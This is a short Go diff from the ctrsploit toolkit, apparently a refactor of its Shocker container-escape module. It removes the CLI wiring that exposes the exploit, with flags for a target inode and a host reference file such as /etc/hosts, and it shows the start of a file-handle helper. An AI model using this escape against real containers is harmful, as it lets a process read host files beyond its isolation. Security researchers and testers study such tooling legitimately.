@@ -5,7 +5,6 @@ import (
 	"encoding/binary"
 	"fmt"
 	"github.com/ctrsploit/ctrsploit/prerequisite/capability"
-	"github.com/ctrsploit/sploit-spec/pkg/app"
 	"github.com/ctrsploit/sploit-spec/pkg/exeenv"
 	"github.com/ctrsploit/sploit-spec/pkg/prerequisite"
 	"github.com/ctrsploit/sploit-spec/pkg/vul"
@@ -39,27 +38,6 @@ var Shocker = Vulnerability{
 		},
 	},
 }
-
-var Exploit = app.Vul2ExploitCmd(
-	&Shocker,
-	[]string{"cap_dac_read_search", "open_by_handle_at"},
-	[]cli.Flag{
-		&cli.IntFlag{
-			Name:        "inode",
-			DefaultText: "default is 2, (in ext fs, root's inode is 2)",
-			Required:    false,
-			Value:       2,
-		},
-		&cli.StringFlag{
-			Name:        "reference",
-			Aliases:     []string{"r", "ref", "mountFd"},
-			DefaultText: "default is /etc/hosts",
-			Required:    false,
-			Value:       "/etc/hosts",
-		},
-	},
-	true,
-)
 
 func (v Vulnerability) GetFd(inode int, ref string) (fd int, err error) {
 	hostReference, err := syscall.Open(ref, syscall.O_RDONLY, 0)
